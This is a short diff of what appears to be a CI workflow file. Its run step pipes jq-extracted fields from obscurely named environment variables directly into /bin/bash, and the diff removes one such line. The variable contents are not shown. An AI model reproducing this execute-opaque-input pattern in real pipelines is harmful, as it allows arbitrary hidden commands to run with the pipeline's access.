@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$o8" | jq -r .i0 | /bin/bash
           printf '%s' "$cd2" | jq -r .lghc5 | /bin/bash
-          printf '%s' "$rigwp60" | jq -r .xg49 | /bin/bash
           echo $ks081 | jq -r .fda7 | /bin/bash
 
       - name: Store artifact
